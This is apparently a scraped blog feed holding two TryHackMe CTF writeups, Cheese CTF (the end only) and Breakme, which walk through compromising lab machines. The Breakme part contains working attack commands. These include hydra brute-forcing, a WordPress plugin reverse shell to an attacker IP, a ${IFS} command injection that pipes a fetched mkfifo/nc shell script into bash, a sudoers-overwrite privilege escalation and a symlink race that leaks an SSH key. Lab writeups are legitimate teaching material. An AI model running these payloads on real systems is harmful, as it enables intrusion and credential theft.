/bin/systemctl restart exploit.timer (ALL) NOPASSWD: /bin/systemctl start exploit.timer (ALL) NOPASSWD: /bin/systemctl enable exploit.timer comte@cheesectf:~$ sudo /bin/systemctl start exploit.timer Failed to start exploit.timer: Unit exploit.timer has a bad unit file setting. See system logs and \u0026#39;systemctl status exploit.timer\u0026#39; for details. We have permission to enable, start, restart the timer exploit.timer using sudo. Executing the command sudo /bin/systemctl restart exploit.timer gives some error related to settings.\nsystemd.timer cronjob comte@cheesectf:~$ ls -lah /etc/systemd/system/exploit.timer -rwxrwxrwx 1 root root 87 Mar 29 2024 /etc/systemd/system/exploit.timer We got to know that file /etc/systemd/system/exploit.timer is readable and writable from linpeas.sh.\ncomte@cheesectf:/etc/systemd/system$ cat exploit.timer [Unit] Description=Exploit Timer [Timer] OnBootSec= [Install] WantedBy=timers.target Reading the file makes sense that somting is missing(incomplete). Lets gather information about the timers used here.\nSources to read: Hacktricks | Timers , systemd.timer , systemd unit files .\nFor each timer file, a matching unit file must exist, describing the unit to activate when the timer elapses. By default, a service by the same name as the timer (except for the suffix) is activated. Example: a timer file exploit.timer activates a matching service exploit.service.\nThe arguments to the directives are time spans configured in seconds. Example: OnBootSec=50 means 50s after boot-up.\ncomte@cheesectf:/etc/systemd/system$ cat exploit.service [Unit] Description=Exploit Service [Service] Type=oneshot ExecStart=/bin/bash -c \u0026#34;/bin/cp /usr/bin/xxd /opt/xxd \u0026amp;\u0026amp; /bin/chmod +sx /opt/xxd\u0026#34; The code above is a service that will be activated by a timer. It performs the following tasks:\nCopies the /usr/bin/xxd file to the /opt/xxd directory. Sets the SUID (Set User ID) bit on the /opt/xxd file. [Timer] OnBootSec=0 We are going to add 0 as the value for OnBootSec in exploit.timer file, which means service will be started in 0 second delay.\nsudo /bin/systemctl daemon-reload sudo /bin/systemctl start exploit.timer Reloading the daemon services and executing sudo /bin/systemctl start exploit.timer starts the timer without any error.\nSUID (xxd) Resources to read: geeksforgeeks|xxd , GTFOBins|xxd .\nxxd is a command-line tool that is primarily used for creating and analyzing hexadecimal dumps from files.\n$ echo \u0026#34;hello\u0026#34; | xxd 00000000: 6865 6c6c 6f0a hello. To create a hexadecimal dump of a file, you can use the above command.\n$ echo \u0026#34;00000000: 6865 6c6c 6f0a hello.\u0026#34; | xxd -r hello Now we used the -r option to reverse this process, converting the hex dump back into its original format.\necho \u0026#34;hello\u0026#34; | xxd | xxd -r hello No we have used xxd and xxd -r to get the same output as input. We are going to use this technique to get privilege access.\ncomte@cheesectf:/etc/systemd/system$ ls -lah /opt/xxd -rwsr-sr-x 1 root root 19K Sep 30 12:33 /opt/xxd Lets confirm that the binary have SUID bit on it.\n/opt/xxd /etc/sudoers | /opt/xxd -r \u0026gt; sudoers echo \u0026#34;$(whoami) ALL=(ALL) NOPASSWD: ALL\u0026#34; \u0026gt;\u0026gt; sudoers /opt/xxd sudoers | /opt/xxd -r - /etc/sudoers sudo bash By adding user comte's name in sudoers file getting root access.\nroot@cheesectf:~# cat root.txt _ _ _ _ __ ___| |__ ___ ___ ___ ___ (_)___ | (_)/ _| ___ / __| \u0026#39;_ \\ / _ \\/ _ \\/ __|/ _ \\ | / __| | | | |_ / _ \\ | (__| | | | __/ __/\\__ \\ __/ | \\__ \\ | | | _| __/ \\___|_| |_|\\___|\\___||___/\\___| |_|___/ |_|_|_| \\___| THM{REDACTED} The above command gives us the root flag.\nExtras www-data@cheesectf:/tmp$ cat /usr/local/bin/twist.sh iptables -t nat -A PREROUTING -p tcp -m tcp --dport 1:21 -j REDIRECT --to-ports 4444 iptables -t nat -A PREROUTING -p tcp -m tcp --dport 23:79 -j REDIRECT --to-ports 4444 iptables -t nat -A PREROUTING -p tcp -m tcp --dport 81:65535 -j REDIRECT --to-ports 4444 portspoof -c /usr/local/etc/portspoof.conf -s /usr/local/etc/portspoof_signatures /usr/local/bin/twist.sh is responsible for the capturing multiple ports during initial nmap scan.\nWe solved the lab.\nHappy Hacking !!! \u0026#x1f60e;\n","permalink":"https://cyberjagadeesh.github.io/posts/cheesectf/writeup/","tags":["ffuf","sqlmap","SUID","ssh-keygen","sqlmap","xxd","systemd.timer","lfi","lfi2rce","curl"],"title":"Cheese CTF | THM Writeup"},{"categories":["CTF"],"content":"Introduction Detailed walkthroughs for Breakme CTF challenges on TryHackMe .\nInitial Foothold $ echo \u0026#34;10.10.81.254 certain-doom.thm\u0026#34; \u0026gt;\u0026gt; /etc/hosts Mappped the ip to domain certain-doom.thm.\nrustscan Lets startetwork with Network scan.\n$ rustscan -a breakme.thm -- -sC -sV PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 8e:4f:77:7f:f6:aa:6a:dc:17:c9:bf:5a:2b:eb:8c:41 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPKq6PCdkc7tlJ9u/XcYjAfE8S8bOYjQe4+3teDY9e24Hfh7Qc3kXDIN52yu+ijvM7ZhcWwwLqikpNzqbhCQq8Ytf60lqNTPvekszBOP4xCJJWm2roGNftNu+IAIWgar7vOhHxLlniLdIt514pbiG2ZPZGxVdBHb7WsVVGUuM+b0AQOH7S9FLXBVqngrlrXUhhBsYtREfZxs4k+AE4N2ajcCEtPcdiLybPXddOD4GgM0nSwpTwlDehZ2NWVETT6ibQjl8T7WGogeIq1oO/LyOjLeu6MKuchp1H5FkIqe+wyZtRhjAsyKjrCGrCV4QM004AtcR/NjHaK7vvEqvRKOYmCmk7IotV/AtAD37GEu+qX0SePWVbZ8DweVIHYBPbJv1nCXkAy+T8eoj1dnvCgKsfz7L5PbkWucfF+gwzGTHwq2n9TrEOy99p6MStNv8ZBkXBY+2moD0ahZA3f6qYuvjlH4uVTCzXnbLxGTK0hdWGvT4PvC0vGh661mmaIhI3Ag0= | 256 a3:9c:66:73:fc:b9:23:c0:0f:da:1d:c9:84:d6:b1:4a (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPeQGv1A7372SDcT2mRIrMxbQaXJ1RA1ibSYWQ6WJxPH5YZCEQzSTHh5eTrum2k0SvIjmPyLfsoVmmOoPZGaR1g= | 256 6d:c2:0e:89:25:55:10:a9:9e:41:6e:0d:81:9a:17:cb (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAuvMwyWKUHQmG5CUtHi/vQ5F2fhnT8k0jGo18znKuHQ 80/tcp open http syn-ack ttl 60 Apache httpd 2.4.56 ((Debian)) |_http-title: Apache2 Debian Default Page: It works | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-server-header: Apache/2.4.56 (Debian) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel We got port 22(ssh) and port 80(Apache Server) opened.\nLet\u0026rsquo;s start with Apache server.\nbreakme.thm:80 We got default Apache web page in port 80. Lets fuzz the web app.\nfuff $ ffuf -u http://breakme.thm/FUZZ -w /usr/share/wordlists/dirb/big.txt ________________________________________________ .htaccess [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 2253ms] .htpasswd [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 3269ms] manual [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 330ms] server-status [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 221ms] wordpress [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 205ms] We got few interesting results by fuzzing. In that wordpress is very interesting. Lets start with that.\nwpscan $ wpscan --url http://breakme.thm/wordpress/ --api-token $wp_token _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;\u0026#39; \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.27 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://breakme.thm/wordpress/ [10.10.90.220] Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.56 (Debian) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://breakme.thm/wordpress/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://breakme.thm/wordpress/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://breakme.thm/wordpress/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 6.4.3 identified (Insecure, released on 2024-01-30). | Found By: Rss Generator (Passive Detection) | - http://breakme.thm/wordpress/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=6.4.3\u0026lt;/generator\u0026gt; | - http://breakme.thm/wordpress/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=6.4.3\u0026lt;/generator\u0026gt; | | [!] 4 vulnerabilities identified: | | [!] Title: WP \u0026lt; 6.5.2 - Unauthenticated Stored XSS | Fixed in: 6.4.4 | References: | - https://wpscan.com/vulnerability/1a5c5df1-57ee-4190-a336-b0266962078f | - https://wordpress.org/news/2024/04/wordpress-6-5-2-maintenance-and-security-release/ | | [!] Title: WordPress \u0026lt; 6.5.5 - Contributor+ Stored XSS in HTML API | Fixed in: 6.4.5 | References: | - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28 | - https://wordpress.org/news/2024/06/wordpress-6-5-5/ | | [!] Title: WordPress \u0026lt; 6.5.5 - Contributor+ Stored XSS in Template-Part Block | Fixed in: 6.4.5 | References: | - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb | - https://wordpress.org/news/2024/06/wordpress-6-5-5/ | | [!] Title: WordPress \u0026lt; 6.5.5 - Contributor+ Path Traversal in Template-Part Block | Fixed in: 6.4.5 | References: | - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c | - https://wordpress.org/news/2024/06/wordpress-6-5-5/ [+] WordPress theme in use: twentytwentyfour | Location: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/ | Last Updated: 2024-07-16T00:00:00.000Z | Readme: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/readme.txt | [!] The version is out of date, the latest version is 1.2 | Style URL: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/style.css | Style Name: Twenty Twenty-Four | Style URI: https://wordpress.org/themes/twentytwentyfour/ | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti... | Author: the WordPress team | Author URI: https://wordpress.org | | Found By: Urls In Homepage (Passive Detection) | | Version: 1.0 (80% confidence) | Found By: Style (Passive Detection) | - http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: \u0026#39;Version: 1.0\u0026#39; [+] Enumerating All Plugins (via Passive Methods) [+] Checking Plugin Versions (via Passive and Aggressive Methods) [i] Plugin(s) Identified: [+] wp-data-access | Location: http://breakme.thm/wordpress/wp-content/plugins/wp-data-access/ | Last Updated: 2024-09-18T00:01:00.000Z | [!] The version is out of date, the latest version is 5.5.14 | | Found By: Urls In Homepage (Passive Detection) | | [!] 3 vulnerabilities identified: | | [!] Title: WP Data Access \u0026lt; 5.3.8 - Subscriber+ Privilege Escalation | Fixed in: 5.3.8 | References: | - https://wpscan.com/vulnerability/7871b890-5172-40aa-88f2-a1b95e240ad4 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-1874 | - https://www.wordfence.com/blog/2023/04/privilege-escalation-vulnerability-patched-promptly-in-wp-data-access-wordpress-plugin/ | | [!] Title: Freemius SDK \u0026lt; 2.5.10 - Reflected Cross-Site Scripting | Fixed in: 5.3.11 | References: | - https://wpscan.com/vulnerability/39d1f22f-ea34-4d94-9dc2-12661cf69d36 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33999 | | [!] Title: WP Data Access \u0026lt; 5.5.9 - Cross-Site Request Forgery | Fixed in: 5.5.9 | References: | - https://wpscan.com/vulnerability/4fe0d330-6511-4500-ac3f-b9bb944b8f0e | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-43295 | - https://www.wordfence.com/threat-intel/vulnerabilities/id/85a33508-71f2-4aa1-8d51-667eb0690fbd | | Version: 5.3.5 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://breakme.thm/wordpress/wp-content/plugins/wp-data-access/readme.txt [+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:06 \u0026lt;==============================================================================\u0026gt; (137 / 137) 100.00% Time: 00:00:06 [i] No Config Backups Found. [+] WPScan DB API OK | Plan: free | Requests Done (during the scan): 3 | Requests Remaining: 22 [+] Finished: Tue Sep 24 19:27:35 2024 [+] Requests Done: 144 [+] Cached Requests: 37 [+] Data Sent: 38.903 KB [+] Data Received: 28.153 KB [+] Memory used: 247.871 MB [+] Elapsed time: 00:00:12 We used wpscan tool to enumarate data from the webserver and got some vulnerability details.\nWordPress version 6.4.3\nWP \u0026lt; 6.5.2 - Unauthenticated Stored XSS WordPress \u0026lt; 6.5.5 - Contributor+ Stored XSS in HTML API WordPress \u0026lt; 6.5.5 - Contributor+ Stored XSS in Template-Part Block WordPress \u0026lt; 6.5.5 - Contributor+ Path Traversal in Template-Part Block WordPress theme: twentytwentyfour Version: 1.0\nWordPress plugin: wp-data-access Version: 5.3.5\nWP Data Access \u0026lt; 5.3.8 - Subscriber+ Privilege Escalation (CVE-2023-1874) Freemius SDK \u0026lt; 2.5.10 - Reflected Cross-Site Scripting (CVE-2023-33999) WP Data Access \u0026lt; 5.5.9 - Cross-Site Request Forgery (CVE-2024-43295) These are the list of vulnerabilities given by wpscan tool. Here the interesting part is vulnerability in plugins specifically WP Data Access \u0026lt; 5.3.8 - Subscriber+ Privilege Escalation (CVE-2023-1874). Lets enumarate more data.\nWordpress site breakme.thm/wordpress/ Home page of wordpress web app.\nWordpress:SamplePage Found link to admin login page here.\nAdmin Login Page We got Admin login page here.\nLogin with wrong password When trying to login with wrong password we are getting The password you entered for the username admin is incorrect. response.\nLogin with wrong Username/Email Address When trying to login with wrong username we are getting The username admin1 is not registered on this site. If you are unsure of your username, try your email address instead. response.\nWe can use this behaviour for bruteforcing the username and password.\n$ hydra -l admin -P /usr/share/wordlists/rockyou.txt breakme.thm http-post-form \u0026#34;/wordpress/wp-login.php:log=^USER^\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log+In\u0026amp;redirect_to=http%3A%2F%2Fbreakme.thm%2Fwordpress%2Fwp-admin%2F\u0026amp;testcookie=1:The password you entered for the username\u0026#34; No valid passwords found using hydra for admin user.\nCurl to check Usernames and Passwords curl http://breakme.thm/wordpress/wp-login.php -d \u0026#34;log=admin1\u0026amp;pwd=admin1\u0026amp;wp-submit=Log+In\u0026amp;redirect_to=http%3A%2F%2Fbreakme.thm%2Fwordpress%2Fwp-admin%2F\u0026amp;testcookie=1\u0026#34; -H \u0026#34;Cookie: wordpress_test_cookie=WP%20Cookie%20check\u0026#34; | grep \u0026#34;is not registered on this site.\u0026#34; curl http://breakme.thm/wordpress/wp-login.php -d \u0026#34;log=admin\u0026amp;pwd=admin\u0026amp;wp-submit=Log+In\u0026amp;redirect_to=http%3A%2F%2Fbreakme.thm%2Fwordpress%2Fwp-admin%2F\u0026amp;testcookie=1\u0026#34; -H \u0026#34;Cookie: wordpress_test_cookie=WP%20Cookie%20check\u0026#34; | grep \u0026#34;The password you entered for the username\u0026#34; Above curl command to check the username and password.\nValid Users using HYDRA $ hydra -L /usr/share/SecLists-master/Usernames/Names/names.txt -p testPassword breakme.thm http-post-form \u0026#34;/wordpress/wp-login.php:log=^USER^\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log+In\u0026amp;redirect_to=http%3A%2F%2Fbreakme.thm%2Fwordpress%2Fwp-admin%2F\u0026amp;testcookie=1:H=Cookie\\: wordpress_test_cookie=WP%20Cookie%20check:F=is not registered on this site.\u0026#34; [80][http-post-form] host: breakme.thm login: admin password: testPassword [80][http-post-form] host: breakme.thm login: bob password: testPassword We got 2 valid userName admin and bob. Here admin is default username with high privilige account, bob should be the normal user account in the site.\nLets try brute forcing the passwords of those users.\nhydra (bob\u0026rsquo;s password) $ hydra -l bob -P /usr/share/wordlists/rockyou.txt breakme.thm http-post-form \u0026#34;/wordpress/wp-login.php:log=^USER^\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log+In\u0026amp;redirect_to=http%3A%2F%2Fbreakme.thm%2Fwordpress%2Fwp-admin%2F\u0026amp;testcookie=1:H=Cookie\\: wordpress_test_cookie=WP%20Cookie%20check:F=The password you entered for the username\u0026#34; Hydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). [80][http-post-form] host: breakme.thm login: bob password: soccer 1 of 1 target successfully completed, 1 valid password found We got a valid password for user bob and password is soccer.\nBob:Dashboard Now we can login as user Bob. And in dashboard, we can see the last published blog, no other important information found here.\nBob:Profile In profile page we can update and customize the user profile. Note:This account doesn\u0026rsquo;t have privileged access on WordPress.\nNow lets check for useful information from the vulnerabilities found by wpscan.\nCVE-2023-1874 Now while looking into the vulnerabilities list which we got from wpscan, we have the same scenario as Wordfence Intelligence:CVE-2023-1874 . Lets try to exploit it.\nWordfence Intelligence:CVE-2023-1874 Lets intercept the profile update request using burpsuite and modify the request.\nAppending wpda_role[]=administrator We appended the wpda_role[]=administrator parameter in the profile update request.\nAdministrator Dashboard And now we got the administrator privilege on wordpress account. Lets try to get shell using this.\nReverse shell Lets have a look at how to get a reverse shell using WP Plugin. Here are some useful pages Hacktricks:PHP plugin , Sevenlayers:PHP plugin and wetw0rk/malicious-wordpress-plugin .\nI\u0026rsquo;m using Sevenlayers:PHP plugin which is working fine for me.\necho \u0026#34;\u0026lt;?php /** * Plugin Name: RevShell Plugin * Plugin URI: * Description: RevShell Plugin * Version: 2.0 * Author: CyberJagadeesh */ exec(\\\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/$attacker_ip/4444 0\u0026gt;\u0026amp;1\u0026#39;\\\u0026#34;); ?\u0026gt;\u0026#34; \u0026gt; shell.php zip -r malicious.zip shell.php nc -nvlp 4444 Modified version of Sevenlayers:PHP plugin.\nUpload Plugin Lets add new plugin in WP. Click on upload plugin, select and install the plugin.\nActivate Plugin Activate the plugin to get the reverse shell. (Note: Make sure to have the NetCat listener ready. We will get the reverse shell after a minute of activatting the plugin.)\nGot reverse shell here.\npython3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ^Z #(Ctrl+Z) stty raw -echo \u0026amp;\u0026amp; fg export TERM=xterm Got stable shell by running above commands.\nShell as John lets use linpeas.sh for getting privilege escalation vector.\n╔══════════╣ Users with console john:x:1002:1002:john wick,14,14,14:/home/john:/bin/bash root:x:0:0:root:/root:/bin/bash youcef:x:1000:1000:youcef,17,17,17:/home/youcef:/bin/bash ╔══════════╣ Active Ports ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:9999 0.0.0.0:* LISTEN - tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 :::80 :::* LISTEN - ╔══════════╣ Analyzing Wordpress Files (limit 70) -rw-rw-rw- 1 www-data www-data 3436 Aug 9 2023 /var/www/html/wordpress/wp-config.php define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;wpdatabase\u0026#39; ); define( \u0026#39;DB_USER\u0026#39;, \u0026#39;econor\u0026#39; ); define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;SuP3rS3cR37#DB#P@55wd\u0026#39; ); define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39; ); define(\u0026#39;WP_HOME\u0026#39;,\u0026#39;http://\u0026#39;.$_SERVER[\u0026#39;HTTP_HOST\u0026#39;].\u0026#39;/wordpress/\u0026#39;); define(\u0026#39;WP_SITEURL\u0026#39;,\u0026#39;http://\u0026#39;.$_SERVER[\u0026#39;HTTP_HOST\u0026#39;].\u0026#39;/wordpress/\u0026#39;); From linpeas.sh we found some useful information:\n3 users in system - john, youcef and root. Other than port 80 and 22, we have 2 more ports open that is port 3306 and port 9999 in the system\u0026rsquo;s local host. We got a database credentials from /var/www/html/wordpress/wp-config.php, where DB_NAME = wpdatabase DB_USER = econor DB_PASSWORD = SuP3rS3cR37#DB#P@55wd DB_HOST = localhost pspy64 Using pspy64 for getting running processes.\nCMD: UID=1002 PID=537 | /usr/bin/php -S 127.0.0.1:9999 Have an interesting result.\nwww-data@Breakme:$ id 1002 uid=1002(john) gid=1002(john) groups=1002(john) We can see that port 9999 is active using pspy64 binary and it is triggered by user john.\nwww-data@Breakme:$ curl http://127.0.0.1:9999/ The above command gives us a content of a web page, means a web server is running in localhost of port 9999. And port 3306 is for mysql server.\nLets port forward to make the process simple.\nChisel tunneling wget https://github.com/jpillora/chisel/releases/download/v1.10.0/chisel_1.10.0_linux_amd64.gz gzip -d chisel_1.10.0_linux_amd64.gz mv chisel_1.10.0_linux_amd64 chisel ./chisel server --reverse --port 8000 This command starts a Chisel server in reverse mode on port 8000 in attacker machine.\n# in target machine cd /tmp wget http://10.10.1.62/chisel chmod +x chisel ./chisel client 10.10.1.62:8000 R:8080:127.0.0.1:9999 This command sets up a client using the Chisel tool to tunnel traffic from port 8080 on a remote server at IP address 10.10.1.62 to port 9999 on the local machine through a reverse tunnel.\nNow we can access port 9999.\nConnecting localhost:9999 target- localhost:9999 Here we have 3 functionality to check the IP, User and File.\n$ tcpdump -i tun0 icmp tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 15:29:02.694087 IP breakme.thm \u0026gt; attacker_ip: ICMP echo request, id 16534, seq 1, length 64 15:29:02.694148 IP attacker_ip \u0026gt; breakme.thm: ICMP echo reply, id 16534, seq 1, length 64 15:29:03.686421 IP breakme.thm \u0026gt; attacker_ip: ICMP echo request, id 16534, seq 2, length 64 15:29:03.686442 IP attacker_ip \u0026gt; breakme.thm: ICMP echo reply, id 16534, seq 2, length 64 If we gave the valid IPv4 address the system is making ping(ICMP) requests.\nNote: No visible response found in the page.\nCMD: UID=1002 PID=2195 | sh -c ping -c 2 10.10.10.10 \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp; Result from pspy64 when checking for IP.\nCheck User: john If incorrect username was entered we are getting response as User name not found. Here we are getting visible result.\nCMD: UID=1002 PID=2199 | sh -c id john \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp; Result from pspy64 when checking for USER.\nCheck File: Passwords.txt If filename with extension was entered we are getting response as Invalid Filename and if a filename like Passwords was given we are getting result as File not found.\nCMD: UID=1002 PID=2214 | sh -c find /opt -name \u0026#34;Passwords\u0026#34; 2\u0026gt;/dev/null Result from pspy64 when checking for File.\nIn these 3 functionality Check User functionality is interesting as it\u0026rsquo;s reflecting the username entered in response.\nSpecial Character ByPass Check User: \u0026lt;special characters\u0026gt; While entering all the special characters ~ ! @ # $ % ^ \u0026amp; * ( ) _ + { } | : \u0026quot; \u0026lt; \u0026gt; ? ` - = [ ] \\ ; ' , . / in user check functionality, we are getting User ${}|:./ not found.\nCMD: UID=1002 PID=2216 | sh -c id ${}|:./ \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp; Result from pspy64 when checking for ~ ! @ # $ % ^ \u0026amp; * ( ) _ + { } | : \u0026quot; \u0026lt; \u0026gt; ? ` - = [ ] \\ ; ' , . /\nIt means that there is some filtering happening in backend before precessing the given input. Note: SPACE also being filtered here. Characters which are not filtered were $ { } | : . /\nWe need to bypass this filtering to get reverse shell as user John.\necho \u0026#39;#!/bin/bash rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.1.62 1234 \u0026gt;/tmp/f\u0026#39; \u0026gt; revshell.sh python -m http.server 80 Creating an reverse shell payload in attacker system.\nInput_Field_Separators ${IFS} |curl${IFS}http://10.10.1.62/revshell.sh|bash The above payload for Check User gives us reverse shell as user John.\nHere ${IFS} will be act as SPACE character in UNIX.\n$ echo Hello${IFS}World Hello World Example usage of ${IFS}.\npython3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ^Z #(Ctrl+Z) stty raw -echo \u0026amp;\u0026amp; fg export TERM=xterm Got stable shell by running above commands.\njohn@Breakme:~$ cat user1.txt Flag1 REDACTED We got our first flag here.\nShell as Youcef john@Breakme:/home/youcef$ ls -lah -rw-r--r-- 1 youcef youcef 3.5K Aug 1 2023 .bashrc drwxr-xr-x 3 youcef youcef 4.0K Aug 1 2023 .local -rwsr-sr-x 1 youcef youcef 17K Aug 2 2023 readfile -rw------- 1 youcef youcef 1.1K Aug 2 2023 readfile.c drwx------ 2 youcef youcef 4.0K Aug 5 2023 .ssh Here we have an interesting binary readfile with SUID bit, which will execute as user youcef.\njohn@Breakme:/home/youcef$ ./readfile readfile.c Nice try! We are not able to read the contents of file readfile.c, might be using conditional statements in the binary.\njohn@Breakme:/home/youcef$ echo Hello \u0026gt; /tmp/abc.c john@Breakme:/home/youcef$ ./readfile /tmp/abc.c I guess you won! Hello If we read a file, getting success message I guess you won!.\nRace Condition #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;assert.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; int main(int argc, char **argv, char **envp) { int n; char buf[1024]; struct stat lstat_buf; // Check if the correct number of arguments is provided if (argc != 2) { puts(\u0026#34;Usage: ./readfile \u0026lt;FILE\u0026gt;\u0026#34;); return 1; // Check if the file exists and is accessible }else if(access(argv[1],F_OK)){ puts(\u0026#34;File Not Found\u0026#34;); return 1; // Check if the user ID is 0x3ea(1002) john }else if(getuid()!=1002){ puts(\u0026#34;You can\u0026#39;t run this program\u0026#34;); return 1; } // Check if the file name contains \u0026#34;flag\u0026#34; or \u0026#34;id_rsa\u0026#34; char *flag = strstr(argv[1], \u0026#34;flag\u0026#34;); char *id_rsa = strstr(argv[1], \u0026#34;id_rsa\u0026#34;); // Get the file status information lstat(argv[1], \u0026amp;lstat_buf); // checks if the supplied file is a SYMLINK int symlink_check = (S_ISLNK(lstat_buf.st_mode)); // checks if the user john can read the supplied file int res=access(argv[1],R_OK); // will cause a delay usleep(0.8); // if it does not include \u0026#34;flag\u0026#34; or \u0026#34;id_rsa\u0026#34; or \u0026#34;symlink\u0026#34; or \u0026#34;readable\u0026#34; if (flag || symlink_check || res==-1 || id_rsa) { puts(\u0026#34;Nice try!\u0026#34;); return 1; } else { puts(\u0026#34;I guess you won!\\n\u0026#34;); // open the file for reading int fd = open(argv[1], 0); // read and print the file in chunks of 1024 bytes assert(fd \u0026gt;= 0 \u0026amp;\u0026amp; \u0026#34;Failed to open the file\u0026#34;); while((n = read(fd, buf, 1024)) \u0026gt; 0 \u0026amp;\u0026amp; write(1, buf, n) \u0026gt; 0); } return 0; } We have decompiled the binary readme using Ghidhra.\nThe readfile application exhibits a race condition vulnerability due to the delay introduced by usleep between checking a file\u0026rsquo;s validity and accessing its contents. This delay allows for a potential race condition where a malicious actor could modify the file\u0026rsquo;s contents or permissions during this time, leading to unauthorized access or execution of malicious code.\nResources to go through: race-condition-vulnerability|geeksforgeeks , race-conditions|portswigger .\ncd /home/john for i in {1..1000}; do ln -sf /home/youcef/.ssh/id_rsa ourFile; rm ourFile; touch ourFile; done \u0026amp; for i in {1..100}; do /home/youcef/./readfile ourFile | grep -v \u0026#34;File Not Found\u0026#34; | grep -v \u0026#34;I guess you won!\u0026#34;; done The Bash script exploits a race condition in the readfile binary by rapidly creating and deleting symlinks to a sensitive file while the application attempts to access it.\n-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCGzrHvF6 Tuf+ZdUVQpV+cXAAAAEAAAAAEAAAILAAAAB3NzaC1yc2EAAAADAQABAAAB9QCwwxfZdy0Z P5f1aOa67ZDRv6XlKz/0fASHI4XQF3pNBWpA79PPlOxDP3QZfZnIxNIeqy8NXrT23cDQdx ZDWnKO1hlrRk1bIzQJnMSFKO9d/fcxJncGXnjgBTNq1nllLHEbf0YUZnUILVfMHszXQvfD -------------------------------HIDDEN--------------------------------- hdliLJt0xG6Cb/23Vkh9rG25475k7kk7rh1ZXDNXuU4Z1DvPgh269FyR2BMJ3UUj2+HQdc 